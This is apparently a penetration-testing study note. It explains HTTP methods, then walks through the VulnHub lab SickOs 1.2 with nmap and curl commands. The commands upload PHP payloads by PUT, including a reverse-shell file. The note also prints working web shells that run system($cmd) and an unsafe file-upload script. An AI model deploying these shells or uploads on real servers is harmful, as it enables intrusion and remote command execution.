# 🌐 **HTTP Methods**

🔗 **Reference:** [MDN HTTP Methods Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods)

---

## 📘 **Overview**
The HTTP methods define the actions that can be performed on resources. Each method has its specific use case and behavior. Below is an overview of the common HTTP methods and examples of how they are used in practice.

---

## 📖 **HTTP Methods Explained**

### 📥 **GET**  
🔹 Retrieves data from the server without making any changes. Safe and idempotent.

### 🗾 **HEAD**  
🔹 Similar to GET, but it only fetches headers, not the body of the resource.

### 📨 **POST**  
🔹 Submits data to be processed to the server. Often results in a change in state or side effects.

### ✏️ **PUT**  
🔹 Replaces the current representation of a resource with the request payload.

### ❌ **DELETE**  
🔹 Deletes the specified resource.

### 🦹 **PATCH**  
🔹 Partially modifies a resource.

### 🔐 **CONNECT**  
🔹 Establishes a tunnel to the server, often used for secure communication through proxies.

### ⚙️ **OPTIONS**  
🔹 Describes the communication options for the target resource, often used for CORS and pre-flight requests.

### 🧪 **TRACE**  
🔹 Used for diagnostic purposes, it returns the request message for debugging.

---

## ⚡️ **Vulnerability Scanning And Examples**

### 🚀 **SickOs 1.2 Machine**  
🔗 **Reference:** [SickOs 1.2 on VulnHub](https://www.vulnhub.com/entry/sickos-12,144/)

### 🔹 **Directory Enumeration Using Dirsearch**
```bash
• dirsearch -u http://192.168.31.219
```
Scans the specified web server for common directories and files using a wordlist.

### 🔹 **Scanning For HTTP Methods With Nmap**

#### 🔍 Basic HTTP Method Scanning
```bash
• nmap -v -Pn -sT -sV -p 80 --script=http-methods.nse 192.168.56.108
```
Scans the target on port 80 to list supported HTTP methods using the `http-methods.nse` script.

#### ⚙️ Advanced Scanning With Service And OS Detection
```bash
• nmap -v -sT -sV -A -O -p 80 --script=http-methods.nse 192.168.31.219
```
Performs service version detection, OS detection, and scans for available HTTP methods.

#### 🔢 Scanning Specific Path For HTTP Methods
```bash
• nmap -v -sT -sV -A -O -p 80 --script=http-methods.nse --script-args http-methods.url-path='/test' 192.168.31.219
```
Checks available HTTP methods for a specific path (`/test`) on the target server.

---

## 🧰 **Using cURL To Interact With HTTP Methods**

### ⚙️ OPTIONS Method
```bash
• curl -v -X OPTIONS http://192.168.31.219/test
• curl -v --request OPTIONS http://192.168.31.219/test
```
Retrieves allowed methods from the server for the given path using the OPTIONS method.

### ✏️ PUT Method (File Uploads And Payloads)
```bash
• vim phpinfo.php
```
```php
<?php
phpinfo();
?>
```
```bash
• curl -T phpinfo.php  http://192.168.31.219/test/
• curl -T 1.txt http://192.168.31.219/test/
• curl -X PUT -T "php-reverse-shell.php" http://192.168.31.219/test/
```
Uploads a file to the target using the PUT method.

### 📨 POST Method
```bash
• curl --request POST --url http://192.168.31.219/test/phpinfo.php --header 'content-type: application/x-www-form-urlencoded' --data '<?php phpinfo(); ?>'
```
Sends form data using POST to the target script.

### ❌ DELETE Method
```bash
• curl -X DELETE http://192.168.31.219/test/demo.txt
```
Sends a DELETE request to remove the file `demo.txt` from the server.

### 👀 GET Method
```bash
• curl -X GET http://192.168.31.219/test/php-reverse-shell.php
• curl --request GET --url 'http://192.168.31.219/test/demo.txt'
```
Retrieves files from the server using GET.

### 🔢 PUT Method With Inline Data
```bash
• curl -X PUT -d "hi" http://192.168.31.219/test/demo.txt
• curl -X PUT -d "<?php phpinfo(); ?>" http://192.168.31.219/test/phpinfo.php
```
Sends text or PHP payloads directly into files via PUT requests.

---

## 🔧 **File Upload Exploit Examples**

### 📁 File Upload Script (`fileupload.php`)
```bash
• vim fileupload.php
```
```php
<!doctypehtml>
<html>
<head><title>Form - Fileupload</title></head>
<body>
<form action="fileupload.php" enctype="multipart/form-data" method="post">
Select File to Upload:<br>
<input name="filetoupload" type="file"><br>
<input name="submit" type="submit" value="Upload"><br>
</form>
<?php
if(isset($_POST['submit'])){
    $file_name = $_FILES["filetoupload"]["name"];
    $file_type = $_FILES["filetoupload"]["type"];
    $file_tmp_name = $_FILES["filetoupload"]["tmp_name"];
    $file_error = $_FILES["filetoupload"]["error"];
    $file_size = $_FILES["filetoupload"]["size"];
    echo "File Name = {$file_name} <br />";
    echo "File Type = {$file_type} <br />";
    echo "File Temp Name = {$file_tmp_name} <br />";
    echo "File Error = {$file_error} <br />";
    echo "File Size = {$file_size} <br />";
    if(move_uploaded_file($file_tmp_name,$file_name)){
        echo "File Uploaded Successfully";
    } else {
        echo "Could not Upload file";
    }
} else {
    echo "Form was not submitted <br />";
}
?>
</body>
</html>
```
A basic PHP script for file uploading. Useful for testing upload functionality or exploitation through insecure file handling.

---

### 🔧 Simple GET-Based PHP Shell (`shell.php`)
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
Allows command execution via URL parameter, e.g., `http://target.com/shell.php?cmd=whoami`

---

### 🔧 POST-Based PHP Shell (`shell-post.php`)
```php
<!doctype html>
<html>
<head><title>CMD Shell with POST</title></head>
<body>
<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
CMD:<br>
<input name="cmd" type="text"><br>
<input name="submit" type="submit" value="cmd"><br>
</form>
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
</body>
</html>
```
Executes system commands submitted via a POST form input. Used for command injection tests or exploitation.

